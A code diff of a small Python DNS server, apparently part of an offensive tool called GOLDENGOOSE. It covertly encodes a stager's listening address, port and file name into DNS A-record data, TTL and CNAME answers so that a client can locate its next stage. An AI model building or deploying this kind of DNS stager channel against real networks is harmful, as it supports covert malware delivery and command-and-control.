@@ -4,15 +4,15 @@ from dnslib import QTYPE,RR,A,CNAME
 from dnslib.server import DNSServer, BaseResolver, DNSLogger
 
 # The ip:port to receive a GOLDENGOOSE client from
-STAGER_LISTEN_ADDR = "127.0.0.1"
-STAGER_LISTEN_PORT = 8443
-STAGER_FILE_NAME   = "WOWZERZ"
+STAGER_LISTEN_ADDR = "127.0.0.1"    # -> Placed into A record rdata
+STAGER_LISTEN_PORT = 8443           # -> Placed into A record TTL
+STAGER_FILE_NAME   = "WOWZERZ"      # -> Placed into CNAME record rdata
 
 class CustomResolver(BaseResolver):
-    def __init__(self, a_record, cname_record, stager_ip):
-        self.a_record = a_record
+    def __init__(self, a_record, cname_record, stager_port):
+        self.a_record     = a_record
         self.cname_record = cname_record
-        self.stager_ip = stager_ip
+        self.stager_port  = stager_port
     
     def resolve(self, request, handler):
         reply = request.reply()
@@ -21,15 +21,15 @@ class CustomResolver(BaseResolver):
         #pdb.set_trace()
     
         if qtype == QTYPE.A:
-            reply.add_answer(RR(qname, QTYPE.A, rdata=A(self.a_record), ttl=self.stager_ip))
+            reply.add_answer(RR(qname, QTYPE.A, rdata=A(self.a_record), ttl=self.stager_port))
             reply.add_answer(RR(qname, QTYPE.CNAME, rdata=CNAME(self.cname_record), ttl=60))
         elif qtype == QTYPE.CNAME:
             reply.add_answer(RR(qname, QTYPE.CNAME, rdata=CNAME(self.cname_record), ttl=60))
     
         return reply
 
-def dns_server(a_record, cname_record, stager_ip, listen_address="0.0.0.0"):
-    resolver = CustomResolver(a_record, cname_record, stager_ip)
+def dns_server(a_record, cname_record, stager_port, listen_address="0.0.0.0"):
+    resolver = CustomResolver(a_record, cname_record, stager_port)
     logger = DNSLogger()
 
     server = DNSServer(resolver, port=53, address=listen_address, logger=logger)
